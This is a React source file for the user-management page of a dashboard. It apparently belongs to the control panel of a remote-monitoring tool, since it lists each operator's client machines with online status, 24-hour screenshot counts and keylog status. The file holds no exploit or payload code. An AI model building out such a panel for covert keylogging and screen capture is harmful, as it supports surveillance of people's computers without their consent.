import { useState, useEffect } from 'react';
import { Users, UserPlus, Edit, Trash2, Shield, User, Eye, Activity } from 'lucide-react';
import { Button, ConfirmModal } from '../../UI';
import { useDashboardStore } from '../../store/dashboardStore.ts';
import { useDatabaseQuery } from '../../hooks/useDatabaseQuery';

interface UserData {
  id: string;
  username: string;
  role: 'admin' | 'user';
  created_at: number;
  last_login: number | null;
  is_active: number;
}

interface DetailClientRow {
  id: string;
  hostname?: string;
  username?: string;
  is_online?: number;
  lastSeen?: number | null;
  last_seen?: number | null;
  keylog_active?: number;
}

function UserManagementPage() {
  const [users, setUsers] = useState<UserData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [showEditModal, setShowEditModal] = useState(false);
  const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [deletingUserId, setDeletingUserId] = useState<string | null>(null);
  const [confirmDelete, setConfirmDelete] = useState<string | null>(null);
  const [expandedUserId, setExpandedUserId] = useState<string | null>(null);
  const [detailLoading, setDetailLoading] = useState(false);
  const [detailError, setDetailError] = useState<string | null>(null);
  const [detailClients, setDetailClients] = useState<DetailClientRow[]>([]);
  const [detailKeylogStatus, setDetailKeylogStatus] = useState<any[]>([]);
  const [detailStats, setDetailStats] = useState<any | null>(null);

  const { setImpersonation, impersonateUserId } = useDashboardStore();
  const { executeQuery } = useDatabaseQuery<any>(undefined, { autoConnect: false });

  // New user form state
  const [newUser, setNewUser] = useState({
    username: '',
    password: '',
    confirmPassword: '',
    role: 'user' as 'admin' | 'user'
  });

  // Edit user form state
  const [editUser, setEditUser] = useState({
    username: '',
    role: 'user' as 'admin' | 'user',
    is_active: 1
  });

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const response = await fetch('/api/auth/users', {
        credentials: 'include',
      });

      let data: any = null;
      try {
        data = await response.json();
      } catch {
        data = null;
      }

      if (!response.ok) {
        throw new Error(data?.error || 'Failed to fetch users');
      }

      const normalizedUsers: UserData[] = (data?.users || []).map((user: any) => ({
        id: String(user?.id ?? ''),
        username: String(user?.username ?? 'unknown'),
        role: user?.role === 'admin' ? 'admin' : 'user',
        created_at: Number(user?.created_at ?? 0),
        last_login: user?.last_login == null ? null : Number(user.last_login),
        is_active: Number(user?.is_active ?? 1) ? 1 : 0,
      }));

      setUsers(normalizedUsers);
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to load users');
      console.error('Error fetching users:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  useEffect(() => {
    const loadDetails = async () => {
      if (!expandedUserId) {
        setDetailClients([]);
        setDetailKeylogStatus([]);
        setDetailStats(null);
        setDetailError(null);
        return;
      }

      try {
        setDetailLoading(true);
        setDetailError(null);

        const [clients, keylogStatus, stats] = await Promise.all([
          executeQuery({ query: 'get_clients', limit: 300, offset: 0, impersonateUserId: expandedUserId }),
          executeQuery({ query: 'get_keylog_status', impersonateUserId: expandedUserId }),
          executeQuery({ query: 'get_statistics', impersonateUserId: expandedUserId })
        ]);

        setDetailClients(Array.isArray(clients) ? clients : []);
        setDetailKeylogStatus(Array.isArray(keylogStatus) ? keylogStatus : []);
        setDetailStats(stats ?? null);
      } catch (err) {
        setDetailError(err instanceof Error ? err.message : 'Failed to load user details');
      } finally {
        setDetailLoading(false);
      }
    };

    loadDetails();
  }, [expandedUserId, executeQuery]);

  const handleCreateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (newUser.password !== newUser.confirmPassword) {
      setError('Passwords do not match');
      return;
    }

    if (newUser.password.length < 6) {
      setError('Password must be at least 6 characters');
      return;
    }

    setIsSubmitting(true);
    try {
      const response = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({
          username: newUser.username,
          password: newUser.password,
          role: newUser.role
        })
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to create user');
      }

      // Reset form and refresh users
      setNewUser({
        username: '',
        password: '',
        confirmPassword: '',
        role: 'user'
      });
      setShowCreateModal(false);
      fetchUsers();
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to create user');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleUpdateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedUser) return;

    setIsSubmitting(true);
    try {
      const response = await fetch(`/api/auth/users/${selectedUser.id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({
          role: editUser.role,
          is_active: editUser.is_active
        })
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to update user');
      }

      // Reset and refresh
      setShowEditModal(false);
      setSelectedUser(null);
      fetchUsers();
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to update user');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDeleteUser = async (userId: string) => {
    setDeletingUserId(userId);
    try {
      const response = await fetch(`/api/auth/users/${userId}`, {
        method: 'DELETE',
        credentials: 'include',
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to delete user');
      }

      fetchUsers();
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to delete user');
    } finally {
      setDeletingUserId(null);
    }
  };

  const formatDate = (timestamp: number | null) => {
    if (!timestamp) return 'Never';
    // SQLite created_at uses strftime seconds; last_login uses Date.now() milliseconds
    // If value looks like seconds (< year 2100 in ms), multiply by 1000
    const ms = timestamp < 1e12 ? timestamp * 1000 : timestamp;
    return new Date(ms).toLocaleString();
  };

  const shortId = (id: string) => {
    const safeId = String(id ?? '');
    return safeId ? safeId.slice(0, 8).toUpperCase() : 'UNKNOWN';
  };

  const openEditModal = (user: UserData) => {
    setSelectedUser(user);
    setEditUser({
      username: user.username,
      role: user.role,
      is_active: user.is_active
    });
    setShowEditModal(true);
  };

  const selectedDetailUser = users.find((u) => u.id === expandedUserId) || null;
  const onlineClientsCount = detailClients.filter((c) => Number(c.is_online) === 1).length;
  const offlineClientsCount = Math.max(0, detailClients.length - onlineClientsCount);
  const keylogActiveCount = detailKeylogStatus.length;
  const lastActivityTs = detailClients.reduce<number>((max, client) => {
    const ts = Number(client.lastSeen ?? client.last_seen ?? 0);
    return ts > max ? ts : max;
  }, 0);

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-slate-400">Loading users...</div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-white">User Management</h1>
          <p className="text-slate-400 mt-1">Manage system users and permissions</p>
        </div>
        <Button
          onClick={() => setShowCreateModal(true)}
          className="flex items-center bg-blue-600 hover:bg-blue-700 text-white border-0"
        >
          <UserPlus className="w-5 h-5" />
          Add User
        </Button>
      </div>

      {/* Error message */}
      {error && (
        <div className="bg-red-900/30 border border-red-700 text-red-300 px-4 py-3 rounded-lg">
          {error}
        </div>
      )}

      {/* Users table */}
      <div className="bg-slate-900 rounded-xl border border-slate-800 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-slate-800">
              <tr>
                <th className="py-3 px-4 text-left text-slate-300 font-medium">User</th>
                <th className="py-3 px-4 text-left text-slate-300 font-medium">Role</th>
                <th className="py-3 px-4 text-left text-slate-300 font-medium">Created</th>
                <th className="py-3 px-4 text-left text-slate-300 font-medium">Last Login</th>
                <th className="py-3 px-4 text-left text-slate-300 font-medium">Status</th>
                <th className="py-3 px-4 text-left text-slate-300 font-medium">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800">
              {users.map((user) => (
                <tr
                  key={user.id}
                  className={`cursor-pointer hover:bg-slate-800/50 ${expandedUserId === user.id ? 'bg-slate-800/40' : ''}`}
                  onClick={() => setExpandedUserId((prev) => (prev === user.id ? null : user.id))}
                >
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center">
                        <User className="w-4 h-4 text-slate-300" />
                      </div>
                      <div>
                        <div className="font-medium text-white">{user.username}</div>
                        <div className="text-xs text-slate-500 font-mono" title={user.id}>ID: {shortId(user.id)}…</div>
                      </div>
                    </div>
                  </td>
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-2">
                      {user.role === 'admin' ? (
                        <>
                          <Shield className="w-4 h-4 text-blue-400" />
                          <span className="text-blue-400 font-medium">Admin</span>
                        </>
                      ) : (
                        <>
                          <Users className="w-4 h-4 text-slate-400" />
                          <span className="text-slate-300">User</span>
                        </>
                      )}
                    </div>
                  </td>
                  <td className="py-3 px-4 text-slate-300">
                    {formatDate(user.created_at)}
                  </td>
                  <td className="py-3 px-4 text-slate-300">
                    {formatDate(user.last_login)}
                  </td>
                  <td className="py-3 px-4">
                    <span className={`px-2 py-1 rounded-full text-xs font-medium ${
                      user.is_active
                        ? 'bg-green-900/30 text-green-400 border border-green-800'
                        : 'bg-red-900/30 text-red-400 border border-red-800'
                    }`}>
                      {user.is_active ? 'Active' : 'Inactive'}
                    </span>
                  </td>
                  <td className="py-3 px-4">
                    <div className="flex items-center gap-2">
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          openEditModal(user);
                        }}
                        variant="ghost"
                        className="p-2 text-slate-400 hover:text-blue-400 hover:bg-slate-800 rounded-lg transition-colors border-0"
                        title="Edit user"
                      >
                        <Edit className="w-4 h-4" />
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          setImpersonation(user.id, user.username);
                        }}
                        variant="ghost"
                        className="p-2 text-slate-400 hover:text-amber-300 hover:bg-slate-800 rounded-lg transition-colors border-0"
                        title="View as this user"
                        disabled={user.role === 'admin'}
                      >
                        <Eye className="w-4 h-4" />
                      </Button>
                      <Button
                        onClick={(e) => {
                          e.stopPropagation();
                          setConfirmDelete(user.id);
                        }}
                        isLoading={deletingUserId === user.id}
                        variant="ghost"
                        className="p-2 text-slate-400 hover:text-red-400 hover:bg-slate-800 rounded-lg transition-colors border-0"
                        title="Delete user"
                        disabled={user.username === 'admin'} // Don't allow deleting the default admin
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {users.length === 0 && (
          <div className="py-12 text-center">
            <Users className="w-12 h-12 text-slate-700 mx-auto mb-4" />
            <p className="text-slate-500">No users found</p>
          </div>
        )}
      </div>

      {/* Drill-down panel */}
      {selectedDetailUser && (
        <div className="bg-slate-900 rounded-xl border border-slate-800 p-5">
          <div className="flex items-center justify-between gap-3 mb-4">
            <div>
              <h2 className="text-xl font-semibold text-white flex items-center gap-2">
                <Activity className="w-5 h-5 text-amber-300" />
                {selectedDetailUser.username} details
              </h2>
              <p className="text-slate-400 text-sm mt-1">User drill-down and context switch</p>
            </div>
            <div className="flex items-center gap-2">
              <Button
                onClick={() => setImpersonation(selectedDetailUser.id, selectedDetailUser.username)}
                className="bg-amber-600 hover:bg-amber-700 text-white border-0"
                disabled={selectedDetailUser.role === 'admin'}
              >
                <Eye className="w-4 h-4" />
                View As
              </Button>
              <Button
                onClick={() => setConfirmDelete(selectedDetailUser.id)}
                className="bg-red-700 hover:bg-red-800 text-white border-0"
                disabled={selectedDetailUser.username === 'admin' || deletingUserId === selectedDetailUser.id}
                isLoading={deletingUserId === selectedDetailUser.id}
              >
                <Trash2 className="w-4 h-4" />
                Delete User
              </Button>
            </div>
          </div>

          {detailLoading ? (
            <div className="text-slate-400">Loading user details...</div>
          ) : detailError ? (
            <div className="bg-red-900/30 border border-red-700 text-red-300 px-4 py-3 rounded-lg">{detailError}</div>
          ) : (
            <>
              <div className="grid grid-cols-1 md:grid-cols-4 gap-3 mb-4">
                <div className="rounded-lg border border-slate-800 bg-slate-950 p-3">
                  <p className="text-xs text-slate-400">Clients</p>
                  <p className="text-lg text-white font-semibold">{detailClients.length}</p>
                  <p className="text-xs text-slate-500">{onlineClientsCount} online / {offlineClientsCount} offline</p>
                </div>
                <div className="rounded-lg border border-slate-800 bg-slate-950 p-3">
                  <p className="text-xs text-slate-400">Recent Screenshots (24h)</p>
                  <p className="text-lg text-white font-semibold">{Number(detailStats?.recentActivity?.screenshots ?? 0)}</p>
                </div>
                <div className="rounded-lg border border-slate-800 bg-slate-950 p-3">
                  <p className="text-xs text-slate-400">Keylog Status</p>
                  <p className="text-lg text-white font-semibold">{keylogActiveCount > 0 ? 'Active' : 'Inactive'}</p>
                  <p className="text-xs text-slate-500">{keylogActiveCount} active client(s)</p>
                </div>
                <div className="rounded-lg border border-slate-800 bg-slate-950 p-3">
                  <p className="text-xs text-slate-400">Last Activity</p>
                  <p className="text-sm text-white font-semibold">{lastActivityTs ? formatDate(lastActivityTs) : 'No activity'}</p>
                </div>
              </div>

              <div className="rounded-lg border border-slate-800 overflow-hidden">
                <div className="bg-slate-800 px-3 py-2 text-slate-300 text-sm font-medium">Clients</div>
                {detailClients.length === 0 ? (
                  <div className="px-3 py-4 text-slate-500 text-sm">No clients for this user</div>
                ) : (
                  <div className="divide-y divide-slate-800">
                    {detailClients.slice(0, 8).map((client) => (
                      <div key={client.id} className="px-3 py-2 flex items-center justify-between">
                        <div>
                          <div className="text-sm text-white">{client.hostname || 'Unknown'} / {client.username || 'Unknown'}</div>
                          <div className="text-xs text-slate-500 font-mono">{String(client.id).slice(0, 10)}…</div>
                        </div>
                        <div className="text-right">
                          <div className={`text-xs font-semibold ${Number(client.is_online) === 1 ? 'text-green-400' : 'text-slate-500'}`}>
                            {Number(client.is_online) === 1 ? 'ONLINE' : 'OFFLINE'}
                          </div>
                          <div className="text-xs text-slate-500">{formatDate(Number(client.lastSeen ?? client.last_seen ?? 0) || null)}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </>
          )}

          {impersonateUserId === selectedDetailUser.id && (
            <div className="mt-3 text-xs text-amber-300">Currently viewing this user context.</div>
          )}
        </div>
      )}

      {/* Create User Modal */}
      {showCreateModal && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 rounded-xl border border-slate-800 w-full max-w-md">
            <div className="p-6">
              <h2 className="text-xl font-bold text-white mb-4">Create New User</h2>
              <form onSubmit={handleCreateUser} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Username
                  </label>
                  <input
                    type="text"
                    value={newUser.username}
                    onChange={(e) => setNewUser({...newUser, username: e.target.value})}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Password
                  </label>
                  <input
                    type="password"
                    value={newUser.password}
                    onChange={(e) => setNewUser({...newUser, password: e.target.value})}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Confirm Password
                  </label>
                  <input
                    type="password"
                    value={newUser.confirmPassword}
                    onChange={(e) => setNewUser({...newUser, confirmPassword: e.target.value})}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Role
                  </label>
                  <select
                    value={newUser.role}
                    onChange={(e) => setNewUser({...newUser, role: e.target.value as 'admin' | 'user'})}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  >
                    <option value="user">User</option>
                    <option value="admin">Admin</option>
                  </select>
                </div>
                <div className="flex gap-3 pt-4">
                  <Button
                    type="submit"
                    isLoading={isSubmitting}
                    className="flex-1 bg-blue-600 hover:bg-blue-700 text-white border-0"
                  >
                    Create User
                  </Button>
                  <Button
                    type="button"
                    onClick={() => setShowCreateModal(false)}
                    disabled={isSubmitting}
                    className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 border-0"
                  >
                    Cancel
                  </Button>
                </div>
              </form>
            </div>
          </div>
        </div>
      )}

      {/* Edit User Modal */}
      {showEditModal && selectedUser && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-slate-900 rounded-xl border border-slate-800 w-full max-w-md">
            <div className="p-6">
              <h2 className="text-xl font-bold text-white mb-4">
                Edit User: {selectedUser.username}
              </h2>
              <form onSubmit={handleUpdateUser} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Username
                  </label>
                  <input
                    type="text"
                    value={editUser.username}
                    disabled
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-400"
                  />
                  <p className="text-xs text-slate-500 mt-1">Username cannot be changed</p>
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Role
                  </label>
                  <select
                    value={editUser.role}
                    onChange={(e) => setEditUser({...editUser, role: e.target.value as 'admin' | 'user'})}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  >
                    <option value="user">User</option>
                    <option value="admin">Admin</option>
                  </select>
                </div>
                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-1">
                    Status
                  </label>
                  <select
                    value={editUser.is_active}
                    onChange={(e) => setEditUser({...editUser, is_active: parseInt(e.target.value)})}
                    className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                  >
                    <option value={1}>Active</option>
                    <option value={0}>Inactive</option>
                  </select>
                </div>
                <div className="flex gap-3 pt-4">
                  <Button
                    type="submit"
                    isLoading={isSubmitting}
                    className="flex-1 bg-blue-600 hover:bg-blue-700 text-white border-0"
                  >
                    Save Changes
                  </Button>
                  <Button
                    type="button"
                    onClick={() => {
                      setShowEditModal(false);
                      setSelectedUser(null);
                    }}
                    disabled={isSubmitting}
                    className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 border-0"
                  >
                    Cancel
                  </Button>
                </div>
              </form>
            </div>
          </div>
        </div>
      )}

      <ConfirmModal
        open={confirmDelete !== null}
        title="DELETE USER"
        message={(() => {
          const target = users.find(u => u.id === confirmDelete);
          return `Permanently delete user "${target?.username || confirmDelete}"? This action cannot be undone and will remove all associated data.`;
        })()}
        confirmLabel="DELETE"
        cancelLabel="ABORT"
        variant="danger"
        onConfirm={() => {
          if (confirmDelete !== null) handleDeleteUser(confirmDelete);
          setConfirmDelete(null);
        }}
        onCancel={() => setConfirmDelete(null)}
      />
    </div>
  );
}

export default UserManagementPage;